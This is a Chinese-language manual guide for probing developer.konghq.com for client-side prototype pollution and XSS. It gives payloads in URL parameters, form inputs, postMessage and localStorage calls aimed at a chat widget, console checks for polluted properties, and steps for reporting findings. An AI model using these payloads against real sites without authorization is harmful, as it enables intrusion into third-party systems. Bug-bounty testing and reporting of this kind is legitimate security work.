# 原型污染浏览器手动测试指南

**目标**: https://developer.konghq.com  
**测试时间**: 2026-05-22  
**测试工具**: 浏览器开发者工具 (F12)

---

## 🎯 测试1: URL参数注入（最有可能成功）

### 步骤1: 打开测试页面

```
访问: https://developer.konghq.com/plugins/?filter[__proto__][test]=123
```

### 步骤2: 打开Console

```
按 F12 → Console 标签
```

### 步骤3: 检查是否污染成功

在Console中输入：

```javascript
// 检查全局是否被污染
console.log("测试1: {}.test =", {}.test);
console.log("测试2: {}.polluted =", {}.polluted);
console.log("测试3: Object.prototype.test =", Object.prototype.test);

// 如果输出不是 undefined，说明污染成功！
```

**预期结果**：
- ❌ 如果都是 `undefined` → 污染失败
- ✅ 如果看到 `"123"` 或其他值 → **污染成功！这是漏洞！**

---

## 🎯 测试2: /plugins/ 页面过滤器

### 步骤1: 打开页面

```
访问: https://developer.konghq.com/plugins/
```

### 步骤2: 找到过滤输入框

```
页面上有17个输入框，可能是：
- 搜索框
- 分类过滤器
- 标签过滤器
- 其他筛选条件
```

### 步骤3: 在输入框中输入Payload

**方法A: 直接输入**

在任意输入框中输入：
```
{"__proto__":{"isAdmin":true}}
```

然后按回车或点击搜索。

**方法B: 通过Console修改输入框值**

```javascript
// 找到所有输入框
const inputs = document.querySelectorAll('input');
console.log("找到", inputs.length, "个输入框");

// 在第一个输入框中注入
inputs[0].value = '{"__proto__":{"test":123}}';
inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
inputs[0].dispatchEvent(new Event('change', { bubbles: true }));

// 触发搜索（如果有搜索按钮）
const searchBtn = document.querySelector('button[type="submit"]') || 
                  document.querySelector('.search-button');
if (searchBtn) searchBtn.click();
```

### 步骤4: 检查污染

```javascript
console.log("{}.test =", {}.test);
console.log("{}.isAdmin =", {}.isAdmin);
```

---

## 🎯 测试3: kapa.ai Widget

### 步骤1: 打开任意页面

```
访问: https://developer.konghq.com/
```

### 步骤2: 等待Widget加载

```
右下角应该会出现 kapa.ai 聊天机器人图标
```

### 步骤3: 通过Console发送Payload

```javascript
// 方法1: 尝试postMessage
window.postMessage({
  type: 'kapa-message',
  data: JSON.stringify({
    "__proto__": {
      "polluted": true,
      "isAdmin": true
    }
  })
}, '*');

// 方法2: 直接修改localStorage
localStorage.setItem('kapa-config', JSON.stringify({
  "__proto__": {
    "test": 123
  }
}));

// 方法3: 在聊天框中输入（如果可以）
// 手动在聊天框输入: {"__proto__":{"test":123}}
// 然后发送
```

### 步骤4: 检查污染

```javascript
console.log("{}.polluted =", {}.polluted);
console.log("{}.isAdmin =", {}.isAdmin);
console.log("{}.test =", {}.test);
```

---

## 🎯 测试4: 搜索功能

### 步骤1: 访问带参数的URL

```
访问: https://developer.konghq.com/?q[__proto__][xss]=<img src=x onerror=alert(1)>
```

### 步骤2: 检查是否有XSS

```
如果弹出alert对话框 → XSS漏洞！
如果只是显示文本 → 继续测试原型污染
```

### 步骤3: 检查原型污染

```javascript
console.log("{}.xss =", {}.xss);
```

---

## 🎯 测试5: 监控网络请求

### 步骤1: 打开Network标签

```
F12 → Network 标签
勾选 "Preserve log"（保留日志）
```

### 步骤2: 执行上述任一测试

### 步骤3: 观察请求

```
查找：
1. 是否有API请求被发送？
2. 请求中是否包含你的payload？
3. 响应中是否有异常？
4. 是否有WebSocket连接？
```

**特别关注**：
- Fetch/XHR 请求
- WebSocket 消息
- postMessage 通信

---

## 📊 成功标志

### ✅ 原型污染成功的证据

```javascript
// 在Console中执行
console.log({}.polluted);

// 如果输出:
"123" 或 "true" 或其他非undefined值

→ 恭喜！发现了原型污染漏洞！
```

### ✅ XSS成功的证据

```
访问: https://developer.konghq.com/?q=<script>alert(1)</script>

如果弹出alert对话框:
→ 发现了XSS漏洞！
```

### ✅ 其他异常行为

- JavaScript错误
- 页面布局错乱
- 意外的网络请求
- 控制台警告/错误

---

## 🔧 调试技巧

### 技巧1: 设置断点

```javascript
// 在Console中设置断点，当访问__proto__时暂停
debug(Object.prototype.__lookupGetter__('__proto__'));

// 或者在特定函数上断点
// 需要先从Sources标签找到相关JS文件
```

### 技巧2: 监控对象变化

```javascript
// 监控全局对象的变化
Object.observe(window, function(changes) {
  console.log("窗口对象变化:", changes);
});

// 现代浏览器使用Proxy
const handler = {
  set: function(target, property, value) {
    console.log(`设置属性: ${property} = ${value}`);
    return Reflect.set(target, property, value);
  }
};

const monitored = new Proxy({}, handler);
```

### 技巧3: 查看事件监听器

```javascript
// 查看所有事件监听器
getEventListeners(document);

// 特别关注:
// - input 事件
// - change 事件
// - submit 事件
// - click 事件
```

---

## 📝 记录测试结果

### 测试记录表

| 测试项 | Payload | 结果 | 备注 |
|--------|---------|------|------|
| URL参数 | `?filter[__proto__][test]=123` | {} .test = ? | 记录输出 |
| /plugins/ 输入框 | `{"__proto__":{"x":1}}` | {} .x = ? | 记录输出 |
| kapa widget | postMessage payload | {} .polluted = ? | 记录输出 |
| 搜索参数 | `?q[__proto__][y]=abc` | {} .y = ? | 记录输出 |

---

## 🎯 如果发现漏洞

### 立即行动

1. **截图保存证据**
   - Console输出
   - 网络请求
   - 页面行为

2. **编写PoC**
   ```javascript
   // 简洁的复现步骤
   // 1. 访问 URL
   // 2. 执行 JS
   // 3. 观察到污染
   ```

3. **评估影响**
   - 能否执行XSS？
   - 能否绕过安全限制？
   - 能否提升权限？

4. **提交报告**
   - 清晰的复现步骤
   - 实际影响的证明
   - 修复建议

---

## ⚠️ 注意事项

1. **不要破坏网站**
   - 只进行测试，不要滥用
   - 避免大量请求
   - 尊重robots.txt

2. **保持道德**
   - 不窃取他人数据
   - 不进行未授权访问
   - 遵守Kong的政策

3. **记录一切**
   - 截图
   - 视频录制
   - 详细笔记

---

**祝你好运！希望能找到真正的漏洞！** 🚀
